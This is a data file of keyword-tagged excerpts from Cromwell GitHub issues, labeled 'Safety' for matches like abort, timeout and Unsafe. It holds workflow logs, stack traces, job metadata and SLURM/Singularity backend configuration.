Changing `throwExceptionOnExecuteError` to `false`, we see that we no longer throw an exception and we get the expected ""no longer running"" message in the log!. ```; 2023-11-01 19:57:48 cromwell-system-akka.dispatchers.backend-dispatcher-162 INFO - PAPI declined to abort job projects/1005074806481/locations/us-central1/operations/5250112889402522122 in workflow b70eafc9-66a7-4b22-b9bc-621c22b5a4ed, most likely because it is no longer running. Marking as finished. Message: Invalid JSON payload received. Unexpected token.; asdf; ^ Payload appears to be compressed. It may either be corrupt or uncompressed data may be too large for the server to handle.; ```. <img width=""1239"" alt=""Screenshot 2023-11-01 at 15 45 48"" src=""https://github.com/broadinstitute/cromwell/assets/1087943/5ce424c4-c3e0-4ffc-b078-f46e065da586"">",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7245:1558,abort,abort,1558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7245,1,['abort'],['abort']
Safety,"s were finished which Cromwell didn't detect. The context: ; - Trying to run jprofiler to get a profile of the run described in #820. Full stack dump:. ```; Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.60-b23 mixed mode):. ""cromwell-system-akka.actor.default-dispatcher-27"" #115 prio=5 os_prio=31 tid=0x00007fb76d052800 nid=0xf503 waiting on condition [0x0000000135d74000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0021d00> (a akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""ForkJoinPool-3-worker-5"" #82 daemon prio=5 os_prio=31 tid=0x00007fb76cc73800 nid=0xcd03 waiting on condition [0x0000000134661000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:1011,Unsafe,Unsafe,1011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"s://genomics.googleapis.com/"",; ""googleProject"": ""broad-dsde-alpha""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""ubuntu:latest"",; ""maxRetries"": ""0"",; ""cpu"": ""1"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-b"",; ""memoryMin"": ""2.048 GB"",; ""memory"": ""2.048 GB""; },; ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ""inputs"": {; ""addressee"": ""World""; },; ""backendLabels"": {; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663"",; ""wdl-task-name"": ""hello""; },; ""labels"": {; ""wdl-task-name"": ""hello"",; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663""; },; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""message"": ""java.lang.IllegalArgumentException: Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""backend"": ""JES"",; ""end"": ""2018-12-11T16:07:04.207Z"",; ""stderr"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stderr.log"",; ""callRoot"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-12-11T16:07:02.746Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2018-12-11T16:07:03.606Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.648Z"",; ""description"": ""RunningJob"",; ""endTime"": ""2018-12-11T16:07:04.116Z""; },; {; ""startTime"": ""2018-12-11T16:07:04.116Z"",; ""description"": ""UpdatingJobStore"",; ""endTime"": ""2018-12-11T16:07:04.207Z""; },; {; ""startTime"": ""2018-12-11T16:07:02.746Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-12-11T16:07:02.746Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.606Z"",; ""description"": ""WaitingForValueStore"",; ""endTime"": ""2018-12-11T16:07:03.607Z""; },; {; ""startTime"": ""201",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4484:1706,Abort,AbortedExecutionHandle,1706,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4484,1,['Abort'],['AbortedExecutionHandle']
Safety,"sage"": ""Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""message"": ""java.lang.IllegalArgumentException: Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""backend"": ""JES"",; ""end"": ""2018-12-11T16:07:04.207Z"",; ""stderr"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stderr.log"",; ""callRoot"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-12-11T16:07:02.746Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2018-12-11T16:07:03.606Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.648Z"",; ""description"": ""RunningJob"",; ""endTime"": ""2018-12-11T16:07:04.116Z""; },; {; ""startTime"": ""2018-12-11T16:07:04.116Z"",; ""description"": ""UpdatingJobStore"",; ""endTime"": ""2018-12-11T16:07:04.207Z""; },; {; ""startTime"": ""2018-12-11T16:07:02.746Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-12-11T16:07:02.746Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.606Z"",; ""description"": ""WaitingForValueStore"",; ""endTime"": ""2018-12-11T16:07:03.607Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.607Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2018-12-11T16:07:03.648Z""; }; ],; ""backendLogs"": {; ""log"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello.log""; },; ""start"": ""2018-12-11T16:07:02.746Z""; }; ]; },; ""outputs"": {},; ""workflowRoot"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/"",; ""actualWorkflowLanguage"": ""WDL"",; ""id"": ""9cc9b141-b2fb-4277-94bd-80ad87a49663"",; ""inputs"": {; ""wf_hello.hello.addressee"": ""World""; },; ""labels"": {; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663"",; ""caas-collection-name"": ""107540717239837386549""; },; ""submission"": ""2018-12-11T16:06:49.563Z"",; ""status"": ""Aborted"",; ""end"": ""2018-12-11T16:07:06.544Z"",; ""start"": ""2018-12-11T16:07:00.970Z""; } ; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4484:3469,Abort,Aborted,3469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4484,1,['Abort'],['Aborted']
Safety,"scala:135); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2018-09-14 13:20:00,08] [info] WorkflowManagerActor WorkflowActor-caab4283-a3d4-4966-85ba-56d0992c8f00 is in a terminal state: WorkflowFailedState; [2018-09-14 13:20:00,92] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2018-09-14 13:20:05,34] [info] Workflow polling stopped; [2018-09-14 13:20:05,36] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-09-14 13:20:05,36] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-09-14 13:20:05,37] [info] Aborting all running workflows.; [2018-09-14 13:20:05,39] [info] WorkflowStoreActor stopped; [2018-09-14 13:20:05,36] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-09-14 13:20:05,39] [info] JobExecutionTokenDispenser stopped; [2018-09-14 13:20:05,40] [info] WorkflowLogCopyRouter stopped; [2018-09-14 13:20:05,40] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-09-14 13:20:05,40] [info] WorkflowManagerActor All workflows finished; [2018-09-14 13:20:05,40] [info] WorkflowManagerActor stopped; [2018-09-14 13:20:05,40] [info] Connection pools shut down; [2018-09-14 13:20:05,41] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,41] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,41] [info] SubWorkflowStoreActor stopped; [2018-09-14 13:20:05,41] ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:8304,Timeout,Timeout,8304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,3,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"scala:135); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2018-10-23 17:49:24,53] [info] WorkflowManagerActor WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c is in a terminal state: WorkflowFailedState; [2018-10-23 17:49:27,64] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2018-10-23 17:49:32,16] [info] Workflow polling stopped; [2018-10-23 17:49:32,17] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-10-23 17:49:32,18] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-10-23 17:49:32,18] [info] Aborting all running workflows.; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:7449,Timeout,Timeout,7449,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,3,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - /bin/bash /cromwell_root/gcs_localization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ localization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Localization; timeout: 300s; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Running\ user\ action:\; docker\ run\ -v\ /mnt/local-disk:/cromwell_root\ --entrypoint\=/bin/bash\; ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9\; /cromwell_root/script; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: UserAction; timeout: 300s; - commands:; - /cromwell_root/script; entrypoint: /bin/bash; imageUri: ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9; labels:; tag: UserAction; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - commands:; - -c; - /bin/bash /cromwell_root/gcs_delocalization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - pr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:19017,timeout,timeout,19017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"sh ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mounted to in the container, so need to change the path with sed; submit-docker = """"""; singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} bash \; ""$(echo ${script} | sed -e 's@.*cromwell-executions@/cromwell-executions@')""; """"""; filesystems {; local {; localization: [""hard-link""]; caching {; duplication-strategy: [""hard-link""]; hasing-strategy: ""fingerprint""; check-sibling-md5: true; fingerprint-size: 1048576 # 1 MB ; }; }; }; }; }; # For running jobs by submitting them from an interactive node to the cluster; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions"". runtime-attributes = """"""; Int cpus = 1; String mem = ""2g""; String dx_timeout; String? docker; """"""; check-alive = ""squeue -j ${job_id}""; exit-code-timeout-seconds = 500; job-id-regex = ""Submitted batch job (\\d+).*"". submit = """"""; sbatch \; --partition ind-shared \; --nodes 1 \; --job-name=${job_name} \; -o ${out} -e ${err} \; --ntasks-per-node=${cpus} \; --mem=${mem} \; -c ${cpus} \; --time=$(echo ${dx_timeout} | sed -e 's/ //g' -e 's/\([0-9]\+\)h\([0-9]\+\)m/\1:\2:00/' -e 's/\([0-9]\+\)h/\1:00:00/' -e 's/\([0-9]\+\)m/\1:00/') \; --chdir ${cwd} \; --wrap ""/bin/bash ${script}""; """"""; kill = ""scancel ${job_id}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mounted to in the container, so need to change the path with sed; submit-docker = """"""; sbatch \; --partition ind-shared \; --nodes 1 \; --job-name=${job_name} \; -o ${out} -e ${err} \; --ntasks-per-node=${cpus} \; --mem=${mem} \; -c ${cpus} \; --time=$(echo ${dx_timeout} | sed -e 's/ //g' -e 's/\([0-9]\+\)h\([0-9]\+\)m/\1:\2:00/' -e 's/\([0-9]\+\)h/\",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:5426,timeout,timeout-seconds,5426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['timeout'],['timeout-seconds']
Safety,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1028,timeout,timeout,1028,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['timeout'],['timeout']
Safety,"sk.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2023-02-04 08:55:08,24] [info] WorkflowManagerActor WorkflowActor-48f62f22-25fe-4f0f-b5fe-21191f035abd is in a terminal state: WorkflowFailedState; [2023-02-04 08:55:08,24] [info] $a [[38;5;2m48f62f22[0m]: Copying workflow logs from /mnt/g/ELM-WES-pipeline/cromwell-workflow-logs/workflow.48f62f22-25fe-4f0f-b5fe-21191f035abd.log to /mnt/g/ELM-WES-pipeline/cromwell_wf_logs/workflow.48f62f22-25fe-4f0f-b5fe-21191f035abd.log; [2023-02-04 08:55:15,88] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2023-02-04 08:55:17,27] [info] Workflow polling stopped; [2023-02-04 08:55:17,29] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2023-02-04 08:55:17,30] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2023-02-04 08:55:17,31] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2023-02-04 08:55:17,31] [info] Aborting all running workflows.; [2023-02-04 08:55:17,31] [info] JobExecutionTokenDispenser stopped; [2023-02-04 08:55:17,31] [info] WorkflowStoreActor stopped; [2023-02-04 08:55:17,32] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2023-02-04 08:55:17,32] [info] WorkflowLogCopyRouter stopped; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor All workflows finished; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor stopped; [2023-02-04 08:55:17,32] [info] Connection pools shut down; [2023-02-04 08:55:17,33] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] SubWorkflowStoreActor stopped; [2023-02-04 08:55:17,33] [info] Shutting down CallCacheWriteActor - Timeo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:16042,Timeout,Timeout,16042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,4,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,spatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.sc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:6117,recover,recover,6117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,spatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockCon,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2458,unsafe,unsafeToFuture,2458,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['unsafe'],['unsafeToFuture']
Safety,spatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockCon,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99698,unsafe,unsafeToFuture,99698,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
